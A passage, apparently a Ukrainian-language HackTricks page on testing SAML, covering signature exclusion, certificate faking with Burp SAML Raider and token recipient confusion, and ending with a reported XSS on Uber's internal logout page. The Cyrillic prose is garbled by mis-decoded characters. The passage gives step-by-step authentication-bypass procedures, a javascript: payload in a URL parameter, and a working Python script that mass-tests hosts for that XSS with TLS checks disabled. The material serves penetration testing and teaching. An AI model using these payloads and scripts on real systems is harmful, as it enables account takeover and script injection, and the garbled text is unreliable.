**XML Signature Exclusion** —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î –∑–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ–π SAML, –∫–æ–ª–∏ –µ–ª–µ–º–µ–Ω—Ç Signature –≤—ñ–¥—Å—É—Ç–Ω—ñ–π. –Ø–∫—â–æ —Ü–µ–π –µ–ª–µ–º–µ–Ω—Ç –≤—ñ–¥—Å—É—Ç–Ω—ñ–π, **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—ñ–¥–ø–∏—Å—É –º–æ–∂–µ –Ω–µ –≤—ñ–¥–±—É—Ç–∏—Å—è**, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º. –ú–æ–∂–ª–∏–≤–æ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ —Ü–µ, –∑–º—ñ–Ω–∏–≤—à–∏ –≤–º—ñ—Å—Ç, —è–∫–∏–π –∑–∞–∑–≤–∏—á–∞–π –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø—ñ–¥–ø–∏—Å–æ–º.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e). –ü–µ—Ä–µ—Ö–æ–ø—ñ—Ç—å SAML Response —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å `Remove Signatures`. –¢–∞–∫–∏–º —á–∏–Ω–æ–º **–≤—Å—ñ** –µ–ª–µ–º–µ–Ω—Ç–∏ Signature –±—É–¥—É—Ç—å –≤–∏–¥–∞–ª–µ–Ω—ñ.

–ó –≤–∏–¥–∞–ª–µ–Ω–∏–º–∏ –ø—ñ–¥–ø–∏—Å–∞–º–∏, –¥–æ–∑–≤–æ–ª—å—Ç–µ –∑–∞–ø–∏—Ç—É –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –¥–æ —Ü—ñ–ª—ñ. –Ø–∫—â–æ –ø—ñ–¥–ø–∏—Å –Ω–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω —Å–µ—Ä–≤—ñ—Å—É

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Certificate Faking - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è, —á–∏ **–ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –ø–æ—Å–ª—É–≥ (SP), —â–æ SAML –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—ñ–¥–ø–∏—Å–∞–Ω–µ** –¥–æ–≤—ñ—Ä–µ–Ω–∏–º –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–æ–º —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (IdP). –¶–µ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è \***—Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞** –¥–ª—è –ø—ñ–¥–ø–∏—Å–∞–Ω–Ω—è SAML Response –∞–±–æ Assertion, —â–æ –¥–æ–ø–æ–º–∞–≥–∞—î –æ—Ü—ñ–Ω–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –¥–æ–≤—ñ—Ä–∏ –º—ñ–∂ SP —Ç–∞ IdP.

### How to Conduct Certificate Faking

–ù–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏ –æ–ø–∏—Å—É—é—Ç—å –ø—Ä–æ—Ü–µ—Å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e):

1. –ü–µ—Ä–µ—Ö–æ–ø—ñ—Ç—å SAML Response.
2. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –º—ñ—Å—Ç–∏—Ç—å –ø—ñ–¥–ø–∏—Å, –Ω–∞–¥—ñ—à–ª—ñ—Ç—å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–æ SAML Raider Certs, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–Ω–æ–ø–∫—É `Send Certificate to SAML Raider Certs`.
3. –£ –≤–∫–ª–∞–¥—Ü—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ SAML Raider –≤–∏–±–µ—Ä—ñ—Ç—å —ñ–º–ø–æ—Ä—Ç–æ–≤–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å `Save and Self-Sign`, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π –∫–ª–æ–Ω –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞.
4. –ü–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –≤ –ø—Ä–æ–∫—Å—ñ Burp. –í–∏–±–µ—Ä—ñ—Ç—å –Ω–æ–≤–∏–π —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∑ –≤–∏–ø–∞–¥–∞—é—á–æ–≥–æ —Å–ø–∏—Å–∫—É XML Signature.
5. –í–∏–¥–∞–ª—ñ—Ç—å –±—É–¥—å-—è–∫—ñ —ñ—Å–Ω—É—é—á—ñ –ø—ñ–¥–ø–∏—Å–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–Ω–æ–ø–∫–∏ `Remove Signatures`.
6. –ü—ñ–¥–ø–∏—à—ñ—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∞–±–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –Ω–æ–≤–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–Ω–æ–ø–∫—É **`(Re-)Sign Message`** –∞–±–æ **`(Re-)Sign Assertion`**, –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ.
7. –ü–µ—Ä–µ—à–ª—ñ—Ç—å –ø—ñ–¥–ø–∏—Å–∞–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –£—Å–ø—ñ—à–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ SP –ø—Ä–∏–π–º–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ –≤–∞—à–∏–º —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, —â–æ –≤–∏—è–≤–ª—è—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ –ø—Ä–æ—Ü–µ—Å—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ SAML –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å.

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion —Ç–∞ Service Provider Target Confusion –≤–∫–ª—é—á–∞—é—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É, —á–∏ **–ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –ø–æ—Å–ª—É–≥ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ –æ—Ç—Ä–∏–º—É–≤–∞—á–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**. –ü–æ —Å—É—Ç—ñ, –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –ø–æ—Å–ª—É–≥ –ø–æ–≤–∏–Ω–µ–Ω –≤—ñ–¥—Ö–∏–ª—è—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é, —è–∫—â–æ –≤–æ–Ω–∞ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —ñ–Ω—à–æ–≥–æ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞. –ö—Ä–∏—Ç–∏—á–Ω–∏–º –µ–ª–µ–º–µ–Ω—Ç–æ–º —Ç—É—Ç —î –ø–æ–ª–µ **Recipient**, —è–∫–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –µ–ª–µ–º–µ–Ω—Ç—ñ **SubjectConfirmationData** SAML Response. –¶–µ –ø–æ–ª–µ –≤–∫–∞–∑—É—î URL, –∫—É–¥–∏ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è. –Ø–∫—â–æ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π –æ—Ç—Ä–∏–º—É–≤–∞—á –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ–º—É –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É –ø–æ—Å–ª—É–≥, –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Å–ª—ñ–¥ –≤–≤–∞–∂–∞—Ç–∏ –Ω–µ–¥—ñ–π—Å–Ω–∏–º.

#### **How It Works**

–î–ª—è —Ç–æ–≥–æ, —â–æ–± –∞—Ç–∞–∫–∞ SAML Token Recipient Confusion (SAML-TRC) –±—É–ª–∞ –∑–¥—ñ–π—Å–Ω–µ–Ω–Ω–æ—é, –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ –ø–µ–≤–Ω—ñ —É–º–æ–≤–∏. –ü–æ-–ø–µ—Ä—à–µ, –º–∞—î –±—É—Ç–∏ –¥—ñ–π—Å–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –Ω–∞ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É –ø–æ—Å–ª—É–≥ (–Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è SP-Legit). –ü–æ-–¥—Ä—É–≥–µ, —Ü—ñ–ª—å–æ–≤–∏–π –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –ø–æ—Å–ª—É–≥ (SP-Target) –ø–æ–≤–∏–Ω–µ–Ω –ø—Ä–∏–π–º–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –≤—ñ–¥ —Ç–æ–≥–æ –∂ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —è–∫–∏–π –æ–±—Å–ª—É–≥–æ–≤—É—î SP-Legit.

–ü—Ä–æ—Ü–µ—Å –∞—Ç–∞–∫–∏ —î –ø—Ä–æ—Å—Ç–∏–º –∑–∞ —Ü–∏—Ö —É–º–æ–≤. –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ —Å–µ—Å—ñ—è —ñ–Ω—ñ—Ü—ñ—é—î—Ç—å—Å—è –∑ SP-Legit —á–µ—Ä–µ–∑ —Å–ø—ñ–ª—å–Ω–æ–≥–æ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. SAML Response –≤—ñ–¥ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ SP-Legit –ø–µ—Ä–µ—Ö–æ–ø–ª—é—î—Ç—å—Å—è. –¶–µ–π –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–∏–π SAML Response, —Å–ø–æ—á–∞—Ç–∫—É –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è SP-Legit, –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è –¥–æ SP-Target. –£—Å–ø—ñ—Ö —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –≤–∏–º—ñ—Ä—é—î—Ç—å—Å—è —Ç–∏–º, —â–æ SP-Target –ø—Ä–∏–π–º–∞—î –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è, –Ω–∞–¥–∞—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –ø—ñ–¥ —Ç–∏–º –∂–µ —ñ–º'—è–º –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–æ—Å—è –¥–ª—è SP-Legit.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS –≤ —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∏—Ö–æ–¥—É

–û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ [—Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).

–ü—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏–Ω–≥—É –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ–π –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –≤–∏—Ö–æ–¥—É –∑–∞ –∞–¥—Ä–µ—Å–æ—é:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
–ü—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ —Ü—å–æ–≥–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –≤—ñ–¥–±—É–ª–∞—Å—è –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü—ñ—è –Ω–∞:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
–¶–µ –≤–∏—è–≤–∏–ª–æ, —â–æ –ø–∞—Ä–∞–º–µ—Ç—Ä `base` –ø—Ä–∏–π–º–∞—î URL. –í—Ä–∞—Ö–æ–≤—É—é—á–∏ —Ü–µ, –≤–∏–Ω–∏–∫–ª–∞ —ñ–¥–µ—è –∑–∞–º—ñ–Ω–∏—Ç–∏ URL –Ω–∞ `javascript:alert(123);` –≤ —Å–ø—Ä–æ–±—ñ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ –∞—Ç–∞–∫—É XSS (Cross-Site Scripting).

### –ú–∞—Å–æ–≤–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è

[–ó —Ü—å–æ–≥–æ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) –±—É–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É –ø—ñ–¥–¥–æ–º–µ–Ω—ñ–≤ `uberinternal.com` –¥–ª—è –¥–æ–º–µ–Ω—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ç—É –∂ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –±—É–≤ —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –Ω–∞—Ü—ñ–ª—é–≤–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É `oidauth/prompt`. –¶–µ–π —Å–∫—Ä–∏–ø—Ç —Ç–µ—Å—Ç—É—î –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å XSS (Cross-Site Scripting), –≤–≤–æ–¥—è—á–∏ –¥–∞–Ω—ñ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏, —á–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è –≤–æ–Ω–∏ –≤ –≤–∏—Ö–æ–¥—ñ. –£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –≤–≤–µ–¥–µ–Ω—ñ –¥–∞–Ω—ñ –¥—ñ–π—Å–Ω–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è, —Å–∫—Ä–∏–ø—Ç –ø–æ–∑–Ω–∞—á–∞—î —Å—Ç–æ—Ä—ñ–Ω–∫—É —è–∫ –≤—Ä–∞–∑–ª–∏–≤—É.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
